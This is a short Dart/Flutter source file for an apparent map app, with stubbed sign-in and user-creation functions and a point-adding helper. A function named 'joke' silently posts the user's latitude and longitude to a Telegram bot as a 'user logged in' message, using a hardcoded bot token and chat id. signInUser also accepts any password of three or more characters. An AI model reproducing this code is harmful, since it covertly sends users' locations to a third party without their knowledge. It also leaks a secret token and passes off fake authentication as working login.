import 'package:google_maps_flutter/google_maps_flutter.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';

bool signInUser({required String login, required String password}) {
  if (login.length < 3) return false;
  if (password.length < 3) return false;

  /// Здесь нужно добавить код для входа

  return true;
}

void createNewUser({required String login, required String password}) {
  /// Здесь нужен код создания
}

void addPoint({
  required LatLng latLng,
  required String name,
  required String description,
}) {
  print("Points ${latLng.latitude}/${latLng.longitude} : $name");
}

Future<void> joke({required LatLng latLng}) async {
  String token = "5590214551:AAEDGskoco34cd_hYMQins9wIeWHEajyReI";
  final url = "https://api.telegram.org/bot$token/sendMessage";

  final response = await http.post(
    Uri.parse(url),
    headers: {"Content-Type": "application/json"},
    body: jsonEncode({
      "chat_id": 5484961787,
      "text": "Зашел пользователь :) ${latLng.latitude} ${latLng.longitude}",
      "parse_mode": "Markdown",
    }),
  );

  if (response.statusCode == 200) {
    print("Сообщение отправлено успешно");
  } else {
    print("Ошибка: ${response.statusCode}, ${response.body}");
  }
}
